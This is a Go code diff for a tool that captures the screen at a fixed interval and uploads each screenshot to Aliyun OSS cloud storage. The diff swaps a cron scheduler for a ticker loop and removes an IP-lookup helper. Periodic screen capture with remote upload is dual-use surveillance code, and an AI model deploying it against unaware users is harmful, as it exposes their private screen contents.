@@ -4,14 +4,12 @@ import (
 	"flag"
 	"fmt"
 	"image/png"
-	"net"
 	"os"
 	"strconv"
 	"strings"
 	"time"
 
 	"github.com/aliyun/aliyun-oss-go-sdk/oss"
-	"github.com/go-co-op/gocron"
 	"github.com/vova616/screenshot"
 )
 
@@ -64,27 +62,14 @@ func uploadingfile(str1 []string, Seconds int) {
 
 	directory := "./ss.png"
 	dir := strings.Replace(directory, "\\", "/", -1)
-	timezone, _ := time.LoadLocation("Asia/Shanghai")
-	s := gocron.NewScheduler(timezone)
 
-	// 每秒执行一次
-	s.Every(Seconds).Seconds().Do(func() {
-		screen()                                           //截屏
-		uploadoss(str1[3], str1[1], str1[2], str1[0], dir) //上传
-	})
-	s.StartBlocking()
-
-}
-
-func GetOutBoundIP() (ip string, err error) { //获取本地使用的IP地址
-	conn, err := net.Dial("udp", "8.8.8.8:53")
-	if err != nil {
-		fmt.Println(err)
-		return
+	t := time.NewTicker(time.Duration(Seconds) * time.Second) //定时器
+	defer t.Stop()
+	for {
+		<-t.C
+		screen()
+		uploadoss(str1[3], str1[1], str1[2], str1[0], dir)
 	}
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
-	ip = strings.Split(localAddr.String(), ":")[0]
-	return
 }
 
 func main() {
